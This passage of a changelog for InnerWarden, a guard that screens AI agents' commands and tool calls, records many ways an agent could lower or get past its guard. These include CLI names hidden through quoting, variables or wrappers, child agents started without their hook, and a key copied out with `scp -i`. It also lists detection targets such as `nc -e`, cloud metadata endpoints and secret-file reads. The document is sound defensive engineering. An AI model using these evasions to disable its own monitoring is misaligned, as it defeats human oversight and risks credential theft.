  never points a hook at a `cargo` build or at a binary other than the
  installed one, and one that fails says the step to take by hand.
- **The record keeps a refused or reviewed command whole,** up to 8192
  characters with a mark where it is cut, beside its short label. Masking now
  also covers passwords in URLs, `--password` and `--token` followed by a
  space, the `-p` of `mysql` and `sshpass`, `-u user:password` for `curl` and
  `wget`, and Basic authorization headers.
- **An agent account the shared record refuses keeps its decisions in its own
  home.** Where InnerWarden Pro's shared record is installed and the agent
  runs as a Linux account outside its group, its decisions go to a private
  record in that account's home instead of being lost, and `innerwarden
  status` says so: Pro does not see them, and the account can edit them.
- **`innerwarden status` judges every hook line.** Every InnerWarden hook is
  judged, per event and matcher: a file-tool, read-tool or result hook whose
  program is gone beside a Bash hook that runs is reported off, with the tools
  it leaves unscreened, and the dashboard says the same. A hook line written
  by hand is reported with the line, a bare program name found on this PATH
  (a hook's or an MCP proxy wrapper's) is "could not tell", and "an agent is
  running" comes from the process scan.
- **A timeout on the Claude Code hook line.** `innerwarden install` and
  `agents connect` write a 50 second `timeout` on each InnerWarden hook line,
  above the 45 seconds the hook takes at most with a second opinion; without
  one Claude Code waits 600 seconds for a hook. An operator's own `timeout`
  is kept, background setup writes none, and `innerwarden status` says how
  long Claude Code waits for the hook.

### Fixed

- **Everyday developer lines are no longer refused.** `grep` with `eval` as a
  quoted pattern; `python3 -c` that imports `os`; a settings fixture written
  under a throwaway `HOME` the same line made. A recursive read of the whole
  home is held for review instead of refused; a hunt for a credential prefix
  or a key marker in it is still refused.
- **The guard's name in a path is no longer refused.** `cd ~/innerwarden/x`,
  and removing a scratch file that shares a name with one of the guard's, now
  run: the guard's own files are held by their real places (its config and
  data folders, the installed binary, the hook in agent settings), and a
  disable verb and its target must be in the same command. Removing the
  guard's folders through `find` from a folder above them is still refused.
- **`curl -K` is no longer read as `curl -k`.** An options file the guard does
  not read is held for review with that reason; one it reads without
  `insecure` is allowed. A search pattern that only feeds later data stages
  is read as data, and the line `xargs` builds from literal words is judged.
- **A key used to authenticate inside a shell line gets the verdict of the
  direct line** (`ssh -i`, `scp -i`, `sftp -i`, `rsync -e 'ssh -i'`,
  `ssh-add`), in `sh -c` and in an MCP tool call. Copying or showing a key
  stays refused, and options that read commands or settings from a file are
  never read as key use.
- **A tool result that only quotes an order to the model passes;** it was
  withheld.
- **A busy machine no longer runs the hook out of time.** The hook's ten
  seconds count the screening, not time spent waiting for a CPU while other
  work runs (on Linux, read from the kernel), under a limit of 25 seconds on
  the clock. `INNERWARDEN_HOOK_DEADLINE_MS` still only lowers it.
- **The shared record's access check opens nothing.** It asks the kernel
  whether the account may use the record and its event log instead of
  opening them, so InnerWarden Pro's watcher no longer sees an open on every
  screened call.
- **`serve`, `graph`, `status` and `llm` refuse a flag they do not know**
  instead of ignoring it, and `innerwarden check` reading from a terminal says
  how to give it the command.

### What this costs

Some ordinary lines are refused or held under an enforcing hook, and the
refusal says why. A `-c` variable set at run time is held for review, and a
line with more than 64 function calls is refused. Editing `authorized_keys`,
the sudo rules, a crontab or a stored credential from the agent's shell is
refused in every form; those are yours to run. A startup file replaced from a
copy, a runtime client pointed at a socket the line does not set, `curl -K`
with an options file the guard does not read, a `bpftool` map write by
numeric id, a download fed to a local script, a recursive removal fed by
`xargs` from input the guard cannot read and a shell tool call with more than
64 KiB of input are held for review. A recursive search of the home for
the start of a credential is refused also when it looks for ordinary text
that starts the same way. `.npmrc`, `.pypirc` and cloud CLI settings outside
the project are judged as `.env` there is. A script that passes `serve`,
`graph`, `status` or `llm` a flag they do not know now fails. An agent in
the AI Jail that reads its key from the environment needs `--pass-env` with
the key's name. A hook line connected by an earlier version has no `timeout`
until it is connected again (`innerwarden status` says so). Going back to
1.6.13 or older after this release needs an `innerwarden uninstall` with the
newer binary first: the older one does not recognise the new hook line (see
the README, Rolling back).

The guard reads text, and its limits are listed in `docs/features.md`, under
[The guard and its own switches](docs/features.md#the-guard-and-its-own-switches).
The boundary there is the host: on Linux, InnerWarden Pro's Execution Gate,
armed for an agent, decides in the kernel which programs that agent's
processes may start, whatever the command line says. It is off until you arm
it.

## 1.6.13 - 2026-11-16

The guard reads more of what an agent starts. An agent that starts Claude
Code without the hook that screens it is refused, Claude Code's read tools
are judged by the rules a shell read is, and a container that hands an agent
the host is refused. The MCP proxy also screens what a server sends back and
lists, reads a command an argument chains onto a server's shell line, and
judges a tool that runs what it is handed by what the call carries. The guard
still reads the text of a command, and what it does not see is written down:
[Where this ends](docs/features.md#where-this-ends).

### Security

- **A child Claude Code started without its hook is refused.** An agent could
  start Claude Code with the hook that screens it switched off or moved away,
  and the child then ran every tool call unscreened while the parent's own
  calls were still judged. Under an enforcing hook such a start is now
  refused as a lowering of the guard: Claude Code started in its bare, safe
  or restricted mode, with setting sources that leave out the user's, with
  settings that switch hooks off or empty the events the guard's hook sits
  under, or with a variable it reads that moves the folder its hook is in or
  switches its hooks off. Where all the line does is point Claude Code at
  another settings folder, the refusal says how to install the hook in that
  folder first (`innerwarden install claude-code --settings
  <folder>/settings.json`). Claude Code started the ordinary way runs, and so
  do settings that add a hook beside the user's, `HOME` set to the home
  folder the shell puts in and `CLAUDE_CONFIG_DIR` set to the folder Claude
  Code already uses, written as the shell expands them.
- **More of the ways a command is started are read.** The rule on a child
  agent follows the launchers it knows (`env`, `sudo`, `nohup`, `timeout`,
  `xargs`, `npx` and the others the docs list), a variable set any way the
  shell sets one (an assignment, `export` and its kin, `read`, a loop's name,
  a default), and a command line handed to another program (a shell's
  command string or its input, `eval`, `watch`, `tmux`, `su`, `find -exec`,
  GNU `parallel`, `cmd /c`, PowerShell's `-Command`). What a line run by
  `eval` sets is read as set for the rest of the line, however `eval` is
  started. A line that another program runs through a shell (`su`,
  `runuser`, `script` and `flock` with their command option, `watch`, a
  `tmux` window, `npx -c` and pnpm's shell mode, a `git` setting given on the
  line whose value git runs) is read as a shell's code is. In the hook and
  in the MCP proxy, a tool call is read in the shapes it carries a command
  in: a command string, an argument list, `args`, an environment as an
  object or a list, text typed into a terminal or handed to a shell, also
  one started through a launcher.
- **Each command line read from a tool call is judged, and the strictest
  verdict stands.** The lines go one at a time through the person's allows,
  the second opinion, the agent profiles and every other layer, and the
  strictest outcome stands, a refusal first. An allow written for one line
  does not let a call run whose other line is refused.
- **A shell or process tool call the hook cannot read is refused, as
  before.** One that holds its command, its arguments or its environment in
  a shape that cannot be read as words is refused as a call the hook cannot
  read. A shell tool call with no command string, refused that way in
  1.6.12, is now read in its other shapes, and is still refused when it
  holds a field the hook does not read, a folder to run in among them.
- **The MCP proxy reads a command chained onto a tool argument as the shell
  does.** A server that puts an argument on a shell line runs a command the
  argument adds after a control operator, in a subshell or in a
  substitution. Each string of a call's arguments is now read with the
  guard's own shell reader, in each place a server may put it, and the call
  is refused when the command it adds reads a file, runs code, fetches or
  relays, changes owners, modes, mounts or processes, takes privilege or
  prints the environment. A shell tool's command line given in another shape
  than its command string is judged as the line it is, and its words are
  also read this way, unless the program they start is a shell.
- **The MCP proxy screens what a server sends back.** A `resources/read` is
  screened both ways: where it reads before the server is asked, and what
  comes back before the client sees it. A secret-shaped value in any server
  answer is masked in `guard` and `kill`; `advisory` and `warn` pass the
  answer on and report it.
- **What a server lists is screened for orders aimed at the model.** The
  descriptions of tools, parameters, resources and prompts, and the
  instructions a server sends when it starts, are screened. In `guard` and
  `kill` the flagged text is replaced with a short notice before the client
  sees it, and a server line the proxy cannot read is refused.
- **Upstream rules for tool results and descriptions.** Fourteen rules the
  Agent Threat Rules project marks stable are added for what a tool returns
  and for tool descriptions. They only alert: none of them refuses a call.
- **Claude Code's read tools are judged.** `Read`, `Grep` and `Glob` carry a
  path and no command, and ran unscreened: the hook was not wired for them.
  `innerwarden install` and `agents connect` now wire them, background setup
  adds them to a hook wired by an earlier version in the mode it has, and
  `innerwarden status` says when they are missing. What they open is judged
  by the secret rules a shell read is: a `Read` of a private key, of a tool's
  stored login or of a `.env` outside the project gets the verdict `cat` of
  the same file gets, also under another name of the same file, such as a
  link to it.
- **A secret file is read as one in more of the ways a line reaches it.** A
  tool's stored login in the home (the token files agent CLIs and developer
  tools keep, `.netrc`, the GitHub CLI's hosts file) is now an always-secret
  read. A private key or the shadow file is read as what it is when the same
  command also names a softer path, a public certificate or a template. A
  path written with `.` parts or doubled slashes, a pattern the shell
  expands to the file, and a recursive read, archive or copy of the home are
  read as reads of the secrets in them.
- **A container that hands an agent the host is refused.** A container run,
  created or entered with full privilege, the host's process namespace, a
  capability that reaches the host, the host's disks or memory as devices, a
  host system folder mounted writable or the host's root mounted, or the
  container runtime's socket mounted; `nsenter` aimed at process 1; a call
  to the runtime's API over its socket or its TCP port; and a debugging pod
  on a cluster node. A mount source is read as the path it names, and
  through its links on this host.
- **Inline code that starts a download is read in more of the ways it is
  written.** Node code is followed through the names it gives the process
  module, a versioned interpreter name reads as the interpreter, Lua's shell
  call and Python's subprocess calls are read, and a download saved to a
  file and then run, by inline code or on a line handed to a shell, is read
  as run. Code handed to a program the line names only at run time is read
  as a shell would run it.
- **A command in a substitution that reads a pipe as code is refused as code
  fed.** A substitution in a piped command's own words runs before that
  command and reads the same pipe, so a shell, an interpreter or a function
  there that reads its input as code ran what the pipe carried, and the line
  was judged by the command it sat in. Such a line is now refused as code
  fed, as a pipe into that interpreter is. A download piped there is refused
  too, not reviewed as a vendor's install line is: no installer is written
  that way.

### Changed

- **The MCP proxy judges a tool that runs what it is handed by what the call
  carries, not by its name.** A tool was refused for a word in its name
  alone. Such a tool is now judged by its arguments: code it is handed passes
  only when it is Python that can only compute and the call says the
  language is Python, a call whose code cannot be found is refused, and
  every other argument must be plain data. Some calls that were refused for
  the tool's name now run.

### Fixed

- **A line that lists or tests the guard's program under a variable path is
  no longer refused.** A word that holds a variable or a command
  substitution and names the guard was read again, one level deeper each
  time, until the depth limit refused it with a reason that said a kernel
  protection was being changed, on lines that only list the program, test
  for it or run a read-only verb. Such a word now reads as itself, and is
  still checked as code.
- **A program under a quoted path that ends in its name is read by that
  name.** A line was refused whenever the word that names its program held a
  command substitution: a linter under the folder a package manager prints,
  a tool under the prefix of a version manager. A path in one pair of double
  quotes, whose substitutions only print a folder, is now read by the name
  after the last expansion.
- **The folder queries of `go env` and `rustc --print sysroot` are read as
  the other package tools' queries are.** A Go or Rust tool under the folder
  that `go env GOPATH`, `GOROOT`, `GOBIN`, `GOMODCACHE` or `GOTOOLDIR`
  prints, or under `rustc --print sysroot`, was still refused as a program
  named at run time. Those queries, with exactly those arguments, are read
  now, and so are the folder queries of `nodenv`, `goenv`, `jenv`, `gem`,
  `uv`, `pipx`, `pipenv` and `conda` and a few more of `npm` and `git`. A
  query is matched as the shell reads it, and a path built this way is read
  by its name only in a line that shows nothing can change what the query
  prints or where its path leads; any other line has it refused, as 1.6.12
  refused it. In such a line every other command is one of a short list
  known to write and run nothing (printing, reading, testing and the folder
  queries themselves), so a command that writes, installs, builds, moves to
  another folder, runs code or a line, or wraps another command counts,
  whether or not it is named anywhere. A variable set alone, exported or
  declared is one of a short list that only says how a tool prints or
  reports, or a build target, flag or size that changes no folder, also in
  a tool call's environment; one set in front of the program, where the
  query has already run, is any but those that pick what the program loads
  or runs. No file is written but the program's own output, no variable is
  named for a descriptor, nothing is reckoned where the shell can run what
  a variable holds (arithmetic, an element named by a variable, a
  substring, a transform), no variable the shell sets from a command is
  read, no function is defined, nothing is fetched, and the program runs
  once, in no loop. The line is read as written, also what a command only
  prints. A line that is only a shell handed one line is read as that
  line. A tool call that holds a field the guard does not read, or a
  variable no shell can name, has its lines judged also as moved first, and
  the entries of a `commands` list also as one line.
- **Showing a public SSH file is no longer refused.** A file in `~/.ssh` was
  read as a secret whatever it held, so a line that showed a public key, the
  known hosts or the authorized keys was refused, and so was a committed
  example of a public key. These are read as public files now. A private
  key named beside one on the same line, a name with a pattern or an
  expansion in it or inside a substitution, a name in a line where the shell
  may turn it into another, and a write into one are judged as before, and
  in the hook a file of such a name that leads to a key is read as the key.
- **A search for key or credential files in a project folder is no longer a
  review.** A search was taken for a hunt across the machine whenever its
  folder lay under the home or under `/srv`, `/opt`, `/var` or `/etc`, so a
  search for `*.pem` in a project there was a review. Only the root, a
  top-level folder where secrets are kept, a home and a hidden folder
  directly in a home count as that broad now, also through a pattern; a
  folder below one of them is a search of that folder.
- **Two ordinary sequences no longer raise a taint alert in the MCP proxy.**
  Listing a folder and then reading a file in it with a tool that calls its
  path `file_path`, and installing a package and then running one of its
  tools, whose answer repeated the name the agent itself had sent.

### What this costs

Some ordinary lines are refused under an enforcing hook, and the refusal says
why. A child agent given `HOME` or `CLAUDE_CONFIG_DIR` in a form the shell
does not expand to the home folder: in quotes or after a backslash, a `~` in
a word `env` or `sudo` is handed (zsh passes it on as written), and any value
in settings JSON. A variable set by arithmetic or by PowerShell anywhere on a
line counts for the whole line. In the MCP proxy, a tool call that gives its
command as an argument list or `args` keeps the file checks on its
arguments, so a private key's path among them is refused there, also as the
identity of `ssh`, and a word of it that would add a command to a server's
shell line is refused, also where the server builds no such line. A public
SSH file is refused, as in 1.6.12, in a line where the shell may turn its
name into another. `eval` is refused however the line starts it, the setup
lines of known tools excepted. A program named by an expansion the guard
cannot resolve, on a line that also holds a substitution or at the end of a
pipe, is refused, and the refusal says how to write the path so that its
name can be read. A program
under a folder query is refused, as in 1.6.12, where the same line also runs
a command outside the short list that writes and runs nothing, sets or
exports a variable outside its short list, or writes a file other than that
program's own output: an install, a build or a move into a folder and then
the tool, a folder made first, a `git` or tool command before it, a pipe
into `tee`, a loop around the tool, and a tool call with a field the guard
does not read or a folder for its command. A container
started with full privilege, with `SYS_ADMIN` or in the host's process
namespace, or with the runtime's socket mounted, and a call to the runtime's
API on its socket, are refused also where that is ordinary work, such as a
test tool that drives containers or a browser run in a container. A
recursive `grep`, an archive or a recursive copy of the home, of a folder
above it or of a hidden folder in the home is refused where a key or a
stored login is kept in it (`~/.config`, where the GitHub CLI can keep its
login), also when it looks for ordinary text. The read tools are refused
what `cat` is: a `Read` of `~/.ssh/config`, of a private key kept in the
project as a test fixture or of a stored login, which ran unscreened before.
A session started in the home folder or at `/` names no project, so a read
of a `.env` from there is refused to the agent, which is told to start in the
project's own folder. A `Read` with no path is refused, as a shell call with
no command is.

The guard reads text, and its limits are listed in `docs/features.md`, under
[The guard and its own switches](docs/features.md#the-guard-and-its-own-switches).
The boundary there is the host: on Linux, InnerWarden Pro's Execution Gate,
armed for an agent, decides in the kernel which programs that agent's
processes may start, whatever the command line says. It is off until you arm
it.

## 1.6.12 - 2026-11-11

A correction first. 1.6.6 said "An agent can no longer lower the guard that
screens it". That was not true as written: the guard reads the text of one
command, and a line could say the same thing in a way the guard read
differently from the shell. This release closes the ways we found, refuses
what it cannot read, and writes down what a guard that reads text does not
see: [The guard and its own switches](docs/features.md#the-guard-and-its-own-switches).

### Security

- **A command that lowers the guard is read as the shell runs it.** Under an
  enforcing hook, the guard's loosening commands were let through when the
  line spelled them in a way the guard did not follow: a backslash inside
  double quotes (`sh -c "sh -c innerwarden\ allow\ x"`), ANSI-C quoting
  (`$'...'`), a comment, a here-document or a redirection between the words
  (`innerwarden 2>/dev/null allow x`), a name built from another value on the
  same line (`A=inner; B=${A}warden; $B monitor`) or cut out of a longer one
  (`${X%/}`), the replace string of `xargs`, an `ssh` option that names a
  command, a backslash as a C shell keeps it inside double quotes, or the
  `-c` argument of `tcsh` and the other shells the list did not hold. Each is
  now read as the shell reads it, at a cost that grows with the length of the
  line and no faster.
- **A line the guard cannot read is refused when it names the guard.** Where
  a part of such a line stays unread (a command word that is a variable
  nothing on the line settles, a substitution that prints the command), the
  line is refused, not guessed at, and the refusal says how to write it so
  that it can be read. A line that does not name the guard is refused this
  way only where its own words spell a loosening command.
- **A write from the shell to what carries the guard is refused.** The file
  tools were already refused a write to the agent settings that load the
  hook, to the guard's configuration and to the guard's program. The same
  write from the shell was not: a redirection, `tee`, `cp`, `mv`, `rm`, `ln`,
  `install`, `sed -i`, `dd`, a download saved over the file, a `chmod` that
  closes it to its owner. Removing, moving or locking an agent's own settings
  folder is refused with it. The writer is found beside a redirection of its
  own, behind a loop word or a wrapper's options, with its target directory
  or its in-place option in any spelling, and under a relative name after a
  `cd` into the folder.
- **Every command that lowers an InnerWarden Pro kernel guard through Pro's
  own tools is refused**, not only the ones the list named.
- **An ssh key used twice on a line is a read of the key.** A key given as
  the identity (`-i`) is key use, and is let through. The excuse was given by
  the text, so a line that named the same file as the identity and as the
  file to copy (`scp -i KEY KEY host:`) copied the key out unrefused. The
  excuse is now given by the place a word stands at, also behind a lock or a
  scheduling wrapper, and a key behind a variable the line sets
  (`F=KEY; cat $F`) is read as the key.
- **A hook that gives no answer refuses the call.** An agent blocks a call
  only when its hook answers with a refusal. A hook that crashed on a fault,
  or that took longer than the agent waits, let the call run, unscreened and
  unrecorded. The hook now answers within ten seconds (thirty where a second
  opinion from a model is configured: that wait has twenty of its own) and
  handles the fault: a refusal under an enforcing hook; in monitor, a line
  that says the call went unscreened. Not closed: a hook that is killed
  outright, a fault on Windows, and an agent set to wait less for its hook
  than the hook takes.

### Fixed

- **`rsync -e ssh` is no longer refused as a reverse shell.** The text
  `rsync -e` ends in the letters of `nc -e`, netcat's exec flag, which was
  matched anywhere in the command. It now counts only where the name starts a
  word.

### What this costs

Some ordinary lines are now refused under an enforcing hook, and the refusal
says they are the person's to run: a program run from a variable on a line
that also names the guard (`P=innerwarden; $P --version`), an agent that
copies a new `innerwarden` binary into place, one that writes a project's
`.mcp.json` or `.claude/settings.json` from the shell, removes a project's
`.claude` folder, or sets an agent's settings file to a mode that takes the
read or the write from its owner (`chmod 400`; `chmod 600` is let through).
The guard's name inside a longer word, a folder such as
`~/src/innerwarden-site`, counts as naming it where the line also holds a
command the guard cannot read and a loosening word. After a `cd` into an
agent's settings folder, a later write to a settings file by its bare name is
refused, also behind a second `cd`. A line that costs more to read than the
guard spends on one line, with a variable in a command left unread or with
more changes of directory than the guard follows, is refused with the way to
shorten it.

## 1.6.11 - 2026-10-24

### Added

- **OpenClaw's own tools are screened before they run.** Until now only the
  MCP servers `agents connect openclaw` wraps went through the guard:
  OpenClaw's own `exec`, `process`, `write`, `edit` and `apply_patch` never
  reached it. `innerwarden agents connect openclaw` now also installs the
  `innerwarden-guard` plugin on OpenClaw's `before_tool_call` hook (OpenClaw
  2026.9.7), which asks `innerwarden openclaw screen` about each call: the
  screening the Claude Code hook uses (the general rules, your allow and mute
  rules, the per-agent profiles, the privileged-file rule for what a file tool
  writes) and, where InnerWarden Pro is installed, Pro's `check-command` too.
  Monitor (the default) records only. After `innerwarden enforce` a deny is
  refused, and the model is told only "Refused by InnerWarden."; a review asks
  you to allow it once or deny it, and nobody answering in time is a refusal.
  The record credits each refusal to the chat it belonged to (the session
  key). The plugin answers first and last among OpenClaw's plugins, so the
  call that runs is the copy that was screened, not a rewrite another plugin
  made in between.
- On a host with InnerWarden Pro, the approval card, `innerwarden agents list`
  and the dashboard's OpenClaw card say what Pro holds there (the Execution
  Gate for this agent, the DNS Guard, the licence), as Pro reads it. A
  conversation attempt is recorded as `kernel_denied` only where Pro's
  Execution Gate, in enforce for that agent, refused a program during a call
  of that chat, as Pro recorded it.
- A one line suggestion about InnerWarden Pro, to the owner only (the Control
  UI approval card, `agents list`, the dashboard), on a measured fact: a
  program this agent tried to run was refused or held for review, or monitor
  let through a call enforce would have stopped. At most once a week unasked,
  never in a reply to a chat, never on macOS or Windows; on a host with Pro
  it names the next step for the gate instead.

### Security

- **The CLI's short names are its name to the guard everywhere.** The hook
  refused `innerwarden dry-run` in a command string, built from quoted pieces
  or behind a variable, but not the same with the installer's `iw` or
  `iw-guard`: `env -S 'iw dry-run'`, `flock -c 'iw dry-run'`, `busybox sh -c
  'iw dry-run'`, `'i'w dry-run` and `I=iw; $I dry-run` passed. The guard now
  reads every name of the CLI in command strings, with the line's quotes and
  the variables it sets resolved as the shell resolves them.
- An agent can no longer take off the OpenClaw guard: a file tool may not
  write into `~/.openclaw/extensions` or `~/.openclaw/hooks`, and the hook
  refuses removing them, `openclaw plugins disable|uninstall` of InnerWarden's
  plugin or hook, adding or enabling an OpenClaw plugin, `openclaw config set`
  of the plugin or MCP wiring, and `sed -i` on `openclaw.json`.
- Active Defence's own guard-lowering verbs are refused like the free CLI's:
  `innerwarden-ctl agent disconnect`, `agent install-hook --remove` and
  `--monitor`, and `innerwarden-ctl uninstall`.
- OpenClaw's exec shell is recognised as an AI agent's shell
  (`OPENCLAW_SHELL`), so `agents disconnect`, `connect --monitor`, `install
  --monitor`, `contain`, `dry-run`, `monitor` and `uninstall` refuse there as
  they do in Claude Code's, Codex's and Gemini CLI's.
- Stated limit: a plugin that freezes a rewrite of its own under an approval
  of its own, before the guard answers, decides what runs; the guard records
  that the call ran other than as screened, after it ran.

## 1.6.10 - 2026-10-24

### Security

- **A wrapper in front of the CLI no longer hides it from the guard.** A
  program the guard did not unwrap (`flock`, `taskset`, `systemd-run --user`,
  `prlimit`, `unshare`, `cpulimit`, `watch`) in front of `iw` let `uninstall`,
  `dry-run` or `agents disconnect` through the enforcing hook, and
  `systemd-run --user` or `env -u` then ran it without the agent's shell
  markers, so the CLI did not refuse it either. Behind any program the guard
  does not know, the CLI named with a verb that lowers the guard is now read
  as run (a program that only reads or prints text keeps it as text).

### Fixed

- The hook no longer refuses `innerwarden uninstall --dry-run`, `--help` and
  `-h`, which remove nothing, and reads them as `uninstall`'s own only before
  `--`.
- Stated limit, widened: a Bash command that only writes a guard verb into a
  file (`echo ... > x.sh`, `printf`, a heredoc) is not screened as running it,
  like a Write or Edit tool call; the CLI refuses the verb when the agent's
  shell runs the file with its markers.

## 1.6.9 - 2026-10-24

### Security

- **An agent can no longer take its guard off with `uninstall`, or lower it
  from a script.** Under an enforcing hook, the hook refused only the literal
  text `innerwarden uninstall`: `iw uninstall claude-code`, a quoted verb or
  two spaces took the hook off. And `innerwarden dry-run`, `monitor` and
  `uninstall` had no refusal of their own in the CLI, so a script the agent
  wrote and ran lowered or removed the hook. The hook now reads `uninstall`
  as the person's whatever its spelling (its own `--dry-run` and help stay
  open), and the CLI refuses `uninstall`, `dry-run` and `monitor` inside an AI
  agent's shell, a script it runs included.
- Stated limit: the CLI's refusal reads the agent's shell markers, which a
  script can unset, and the content of a file the agent writes with a Write
  or Edit tool call is not screened for these verbs.

## 1.6.8 - 2026-10-24

### Security

- **Two more ways an agent could lower its own guard are closed.** Under an
  enforcing hook, `innerwarden install <agent> --monitor` rewired the hook to
  record only, as `agents connect --monitor` did before 1.6.6, and was let
  through. And the hook read a help flag or a `--dry-run` anywhere in a
  `contain` line, including in the agent's own command after `--` (`contain
  --setup --monitor -- -h`) or after the first word (`contain --monitor true
  --dry-run`), so it let through a `contain` that then rewired the hook. The
  hook now refuses `install --monitor` as the person's, the CLI refuses it
  inside an AI agent's shell, and `contain`'s help and dry run are read among
  its own arguments only, as the CLI reads them.
- Stated limit, unchanged: the CLI's own refusal reads the agent's shell
  markers, which a script the agent writes can unset, and the hook knows the
  CLI by its names (`innerwarden`, `iw`, `iw-guard`), so a renamed copy run
  from a script is not seen. The hook refuses every spelling it can read.

## 1.6.7 - 2026-10-24

### Added

- **A refusal made in a jail reaches the host's case.** Inside a jail started
  with `contain --identity`, where Active Defence runs on the host, the hook
  now reports each shell command it refuses itself (a deny of the general
  rules, a hard rule, a profile's refusal) to the host once the refusal
  stands, so the host's case of that session lists it beside the commands it
  was asked about. The refusal is the hook's, and nothing the host answers
  changes it. An older Active Defence refuses the report, and nothing else
  changes.

### Fixed

- Tests for three gaps the nightly mutation sweep found (the account's keys
  removed behind a rewrite, the remote MCP server count of a Codex file, and a
  guard that could never be false in the credential-store check).

## 1.6.6 - 2026-10-24

### Security

- **The guard refuses an agent three more commands that lower it.** (This
  entry first said "An agent can no longer lower the guard that screens it",
  which is more than a guard that reads the text of a command can promise:
  see 1.6.12 and [the limits](docs/features.md#where-this-ends).) Under an
  enforcing hook, `innerwarden agents connect <agent> --monitor`,
  `innerwarden agents disconnect` and `innerwarden contain` (which rewrites
  the agent's hook) were let through, while `dry-run` and `monitor` were
  refused. The hook now refuses all of them as the person's, and the CLI
  refuses them inside an AI agent's shell, where the hook cannot see the call
  (a script the agent wrote). A read, a connect that keeps enforcing, help and
  `contain --dry-run` stay open.

### Fixed

- **`innerwarden contain` keeps the hook's mode.** With no mode asked, it set
  an enforcing hook to monitor, unsaid, also when the jail then failed to
  start. It now keeps the mode the hook already has (a first wiring takes
  monitor), and says the mode on every run.

## 1.6.5 - 2026-10-24

1.6.4 was tagged and not published: its new jail check on macOS started
`sandbox-exec` with the account's environment. 1.6.5 is 1.6.4 with that check
under the launcher's own environment (root's two folders as `PATH`, no loader
variable), as every program a launch starts.


### Added

- **The dashboard shows what the free product does.** Overview, Decisions,
  Protection, Agents and Tokens were rebuilt on one foundation: each agent
  with its mode, what it screens and how to restart it (Claude Code: `/exit`,
  then `claude`; Codex: quit and start again), the decision history by day
  with the reason in words, recent sessions, the allow and mute lists with
  their remove step, the jail check, and how many MCP servers each agent has
  (local and remote). A value that could not be read is said as not read,
  never as off or zero, and monitor is said plainly.
- **One plan notice for an Active Defence host**: its licence ending soon,
  partly covered, lapsed to free mode, or not read, with the one step that
  fixes it. A Community install draws none.
- `install`, `agents connect`, `enforce` and `dry-run` say how to restart each
  agent they changed.

### Changed

- tokio 1.53.3 (RUSTSEC-2026-0386).

## 1.6.3 - 2026-10-23

### Fixed

- **Every cloud's metadata service is an internal target.** Besides EC2,
  Azure and GCP (`169.254.169.254`, `metadata.google.internal`) and Alibaba,
  the guard now reads the ECS task credentials endpoint (`169.254.170.2`,
  `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`), EKS Pod Identity
  (`169.254.170.23`) and EC2's IPv6 endpoints (`fd00:ec2::254`,
  `fd00:ec2::23`), with the address ended by a quote, a bracket or a
  variable too. Their credential reads are refused.
- **Removing the account's keys is destructive**, as removing the home is:
  `rm` of `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.kube`, `~/.azure`,
  `~/.config/gcloud`, `~/.aws/credentials`, `~/.kube/config` or a private
  key `~/.ssh/id_*` is refused. `rm ~/.ssh/known_hosts`, a `.pub` and a
  cache under a store stay cleanups.
- **`innerwarden graph --clear` is the person's**, as `allow` and `mute`
  are: refused with no terminal (an operator's `--operator` outside an
  agent's shell clears it), and the hook refuses an agent that runs it.
- **`check`'s human summary writes out what would repaint or hide the
  command** (control characters other than a new line or a tab, bidi
  overrides, characters that draw nothing) as `\u{..}`. `--json` is
  unchanged.
- **Chat alerts ping nobody and link nowhere**: Discord parses no mention in
  them, and Slack's `&`, `<` and `>` are escaped.

## 1.6.2 - 2026-10-23

### Fixed

- **The user namespace check of 1.6.1 runs bubblewrap like every other
  program `contain` starts**: with root's two folders as `PATH` and no
  dynamic loader variable (`helper_env`), instead of a cleared environment.
  Nothing a person sees changes; Active Defence reads the launcher's
  contract by that shape before it pins a free CLI release.

## 1.6.1 - 2026-10-23

### Fixed

- **`innerwarden contain` on Ubuntu 26.04 (and any kernel that restricts
  unprivileged user namespaces) asks bubblewrap itself.** Under
  `kernel.apparmor_restrict_unprivileged_userns = 1` it looked only for a
  profile file of its own and refused where the distribution's profile
  (`/etc/apparmor.d/bwrap-userns-restrict`, Ubuntu 26.04) already grants
  bwrap a user namespace, and the profile it printed replaced the
  distribution's once loaded. A run now starts bwrap once with a user
  namespace (`bwrap --unshare-user --ro-bind / / true`, 5 seconds at most):
  granted, nothing is said, whatever profile granted it; refused, the advice
  is said. Refused with the distribution's profile on disk, the advice loads
  that one (`sudo apparmor_parser -r /etc/apparmor.d/bwrap-userns-restrict`)
  and never writes another. A dry run, which runs nothing, goes by the files
  on disk, the distribution's included.

## 1.6.0 - 2026-10-22

### Upgrade notes: what to do

- **A profile's read-only path (`extra_ro`) through a link stays read-only
  where it leads.** `innerwarden contain --identity` follows your own links
  in such a path (in folders no jail writes: `~/code` or `~/.local` kept on
  another disk) and lays the path where the jail shows the folder it leads
  to. A link in a folder a jail writes (`~/.local/share/demo`, which a
  program in an earlier jail could have made) is followed only to a place
  the jail shows already, and the start says on one line that the link
  itself is not held ("... is a link in a folder a program in the jail can
  write: the jail keeps <where it leads>, where it leads, read-only, but
  that program could replace the link; ..."): replace the link with the
  folder it leads to. Such a link to a place the jail shows nothing else of
  is not followed: the path is left out, said ("... the jail does not
  follow it, and starts without the extra path; list the real folder
  instead"). On macOS nothing of this is left out: the path is denied
  writing as named and where it leads. On Linux, where `bwrap` cannot bind
  a folder from a descriptor (its `--help` lists no `--ro-bind-fd`: upstream
  bubblewrap before 0.10.0, or a distribution's package without the security
  update that added it; the current packages of Debian 12, Ubuntu 22.04 and
  24.04, and RHEL 9 have it), a read-only path in a folder a jail writes
  (`<project>/vendor`, `~/.local/share/claude/versions`) is left out and said
  ("... does not make it read-only; bubblewrap 0.10.0 or later, ... keeps
  it"): the jail shows it and its programs can write it, where 1.5.5 laid it
  read-only by name. Update bubblewrap to keep it. A profile with
  `start = "only_when_admitted"` does not start there: the launch stops,
  names each such path and says what to do. A read-only path in a place the
  jail hides (on Linux `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.mozilla`,
  `~/.thunderbird` and InnerWarden's own
  folder; on macOS `~/.ssh`, `~/.gnupg`, `~/.aws`, InnerWarden's own folder,
  `~/Library/Mail`, `~/Library/Messages` and `~/Library/Safari`; or where one
  of them leads), under a profile's `hide_home` path, your home or a folder
  above it, or with `--identity` `/run` or `/sys`, used to stop the launch:
  it is left out now, said on one line, and the jail starts without it. One
  that holds such a place where the jail shows it already (`~/.config`,
  which holds InnerWarden's own folder) is laid read-only, and the place
